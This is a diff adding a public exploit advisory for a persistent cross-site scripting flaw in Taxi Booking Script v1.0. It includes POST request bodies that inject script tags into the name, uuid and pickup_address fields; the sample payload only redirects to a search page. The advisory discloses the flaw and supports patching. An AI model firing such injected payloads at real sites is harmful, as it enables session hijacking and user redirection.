@@ -1,0 +1,45 @@
+# # # # #
+# Exploit Title: Taxi Booking Script v1.0 - Cross-site Scripting (XSS)
+
+# Date: 11.01.2018
+# Vendor Homepage: https://www.phpjabbers.com/taxi-booking-script/
+# Software Link: 
+# Demo: http://demo.phpjabbers.com/1515648238_792/index.php?controller=pjAdminUsers&action=pjActionIndex&err=AU01
+# Version: 1.0
+# Category: Webapps
+# Tested on: Windows 10
+# CVE: N/A
+# # # # #
+# Exploit Author: Tauco
+
+Description:
+===========================================================================
+The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash, or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data, like cookies or other session information, to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. 
+
+POC:
+
+Exploit code(s):
+===============
+
+Persistent XSS:
+1. user_update=1&id=2&role_id=1&email=admin%40a.com&password=1231231&name=<script>window.location='https://www.google.com/search?q=xss'</script>&phone=123131&status=T
+
+2. booking_update=1&id=3&tab_id=tabs-1&uuid=<script>window.location='https://www.google.com/search?q=xss'</script>&booking_date=11-01-2018 13:06&pickup_address=<script>window.location='https://www.google.com/search?q=xss'</script>&return_address=Santa Fe 1236, Rosario, Santa Fe Province, Argentina&distance=123&fleet_id=1&passengers=1&luggage=1&extra_id[]=1&sub_total=374.40&tax=37.44&total=411.84&deposit=41.18&payment_method=bank&cc_type=&cc_num=&cc_exp_month=&cc_exp_year=&cc_code=&status=cancelled&client_id=5&c_fname=asd&c_lname=asd&c_phone=12&c_email=asda&c_company=dasdasd&c_address=asda&c_city=asdasd&c_state=asdasda&c_zip=1212&c_country=&c_notes=asdad&c_airline_company=adsad&c_flight_number=adsasd&c_flight_time=13:05&c_terminal=1
+
+
+Severity Level:
+=========================================================
+High
+
+
+Description:
+==========================================================
+ 
+ 
+Request Method(s):              [+]  POST & GET
+ 
+ 
+Vulnerable Product:             [+]  Taxi Booking Script v1.0
+ 
+ 
+Vulnerable Parameter(s):        [+]  name, uuid, pickup_address
